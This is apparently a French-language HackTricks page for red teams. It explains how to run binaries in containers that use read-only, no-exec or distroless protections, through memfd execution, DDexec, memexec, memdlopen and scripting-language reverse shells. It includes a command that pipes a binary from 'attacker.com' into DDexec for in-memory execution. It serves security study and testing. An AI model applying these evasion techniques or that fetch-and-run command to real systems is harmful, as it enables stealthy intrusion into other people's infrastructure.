# Bypass des protections FS : read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}


## Vidéos

Dans les vidéos suivantes, vous trouverez une explication plus approfondie des techniques mentionnées sur cette page :

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## Scénario read-only / no-exec

Il est de plus en plus courant de trouver des machines linux montées avec une **protection du système de fichiers en lecture seule (ro)**, particulièrement dans les containers. Cela s'explique par le fait qu'exécuter un container avec un système de fichiers ro est aussi simple que de définir **`readOnlyRootFilesystem: true`** dans le `securitycontext` :

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Cependant, même si le système de fichiers est monté en ro, **`/dev/shm`** restera accessible en écriture. Il est donc faux de penser que nous ne pouvons rien écrire sur le disque. Toutefois, ce dossier sera **monté avec une protection no-exec**, donc si vous y téléchargez un binaire, vous **ne pourrez pas l'exécuter**.

> [!WARNING]
> Du point de vue d'une red team, cela **complique le téléchargement et l'exécution** de binaires qui ne sont pas déjà présents sur le système (comme des backdoors ou des enumerateurs tels que `kubectl`).

## Contournement le plus simple : Scripts

Notez que j'ai mentionné les binaires : vous pouvez **exécuter n'importe quel script** tant que l'interpréteur se trouve sur la machine, comme un **shell script** si `sh` est présent, ou un **script Python** si **python** est installé.

Cependant, cela ne suffit pas pour exécuter votre backdoor binaire ou les autres outils binaires dont vous pourriez avoir besoin.

## Contournements par la mémoire

Si vous voulez exécuter un binaire mais que le système de fichiers ne l'autorise pas, la meilleure solution consiste à **l'exécuter depuis la mémoire**, car les **protections ne s'y appliquent pas**.

### Contournement FD + exec syscall

Si vous disposez de puissants moteurs de script sur la machine, comme **Python**, **Perl** ou **Ruby**, vous pouvez télécharger le binaire à exécuter depuis la mémoire, le stocker dans un descripteur de fichier en mémoire (`create_memfd` syscall), qui ne sera pas protégé par ces protections, puis appeler un **`exec` syscall** en indiquant le **fd comme fichier à exécuter**.

Pour cela, vous pouvez facilement utiliser le projet [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Vous pouvez lui fournir un binaire et il générera un script dans le langage indiqué, avec le **binaire compressé et encodé en b64**, ainsi que les instructions pour le **décoder et le décompresser** dans un **fd** créé en appelant le `create_memfd` syscall, puis un appel à l'**exec** syscall pour l'exécuter.

> [!WARNING]
> Cela ne fonctionne pas avec d'autres langages de script comme PHP ou Node, car ils ne disposent d'**aucun moyen par défaut d'appeler des syscalls bruts** depuis un script. Il n'est donc pas possible d'appeler `create_memfd` pour créer le **memory fd** destiné à stocker le binaire.
>
> De plus, la création d'un **fd classique** avec un fichier dans `/dev/shm` ne fonctionnera pas, car vous ne pourrez pas l'exécuter : la **protection no-exec** s'appliquera.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) est une technique qui permet de **modifier la mémoire de votre propre processus** en écrasant son **`/proc/self/mem`**.

Par conséquent, en **contrôlant le code assembly** exécuté par le processus, vous pouvez écrire un **shellcode** et faire « muter » le processus pour **exécuter n'importe quel code arbitraire**.

> [!TIP]
> **DDexec / EverythingExec** vous permettra de charger et d'**exécuter** votre propre **shellcode** ou **n'importe quel binaire** depuis la **mémoire**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Pour plus d'informations sur cette technique, consultez le Github ou :

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) est l'étape suivante naturelle de DDexec. Il s'agit d'un **DDexec shellcode démonisé** : ainsi, chaque fois que vous voulez **exécuter un binaire différent**, vous n'avez pas besoin de relancer DDexec. Vous pouvez simplement exécuter le shellcode memexec via la technique DDexec, puis **communiquer avec ce démon pour lui transmettre de nouveaux binaires à charger et à exécuter**.

Vous trouverez un exemple expliquant comment utiliser **memexec pour exécuter des binaires depuis un reverse shell PHP** à l'adresse [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Dans un but similaire à DDexec, la technique [**memdlopen**](https://github.com/arget13/memdlopen) permet de **charger plus facilement des binaires** en mémoire afin de les exécuter ultérieurement. Elle peut même permettre de charger des binaires avec leurs dépendances.

## Distroless Bypass

Pour une explication dédiée de **ce qu'est réellement distroless**, des cas où cela est utile ou non, et de la manière dont cela modifie les pratiques de post-exploitation dans les containers, consultez :

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Qu'est-ce que distroless

Les containers distroless contiennent uniquement les **composants strictement nécessaires à l'exécution d'une application ou d'un service spécifique**, tels que les bibliothèques et les dépendances d'exécution, mais excluent les composants plus importants comme un gestionnaire de packages, un shell ou les utilitaires système.

L'objectif des containers distroless est de **réduire la surface d'attaque des containers en éliminant les composants inutiles** et en minimisant le nombre de vulnérabilités pouvant être exploitées.

### Reverse Shell

Dans un container distroless, vous pourriez **ne même pas trouver `sh` ou `bash`** pour obtenir un shell classique. Vous ne trouverez pas non plus de binaires tels que `ls`, `whoami`, `id`... ni tout ce que vous exécutez habituellement sur un système.

> [!WARNING]
> Par conséquent, vous ne pourrez **pas** obtenir de **reverse shell** ni **énumérer** le système comme vous le faites habituellement.

Cependant, si le container compromis exécute par exemple une application web Flask, Python y est installé et vous pouvez donc obtenir un **reverse shell Python**. S'il exécute Node, vous pouvez obtenir un reverse shell Node, et il en va de même pour la plupart des **langages de script**.

> [!TIP]
> En utilisant le langage de script, vous pourriez **énumérer le système** grâce aux fonctionnalités de ce langage.

S'il n'existe **aucune** protection **`read-only/no-exec`**, vous pourriez exploiter votre reverse shell pour **écrire vos binaires dans le système de fichiers** et les **exécuter**.

> [!TIP]
> Cependant, dans ce type de containers, ces protections seront généralement présentes, mais vous pourriez utiliser les **techniques précédentes d'exécution en mémoire pour les contourner**.

Vous trouverez des **exemples** expliquant comment **exploiter certaines vulnérabilités RCE** afin d'obtenir des **reverse shells** dans des langages de script et d'exécuter des binaires depuis la mémoire à l'adresse [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../../banners/hacktricks-training.md}}
